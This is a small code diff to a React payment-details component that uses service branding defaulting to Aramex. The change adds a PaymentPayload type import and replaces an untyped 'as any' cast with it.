@@ -1,3 +1,4 @@
+import type { PaymentPayload } from "@/types/payload";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
@@ -17,7 +18,7 @@ const PaymentDetails = () => {
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
   const branding = getServiceBranding(serviceKey);
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = linkData?.payload as PaymentPayload;
 
   // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
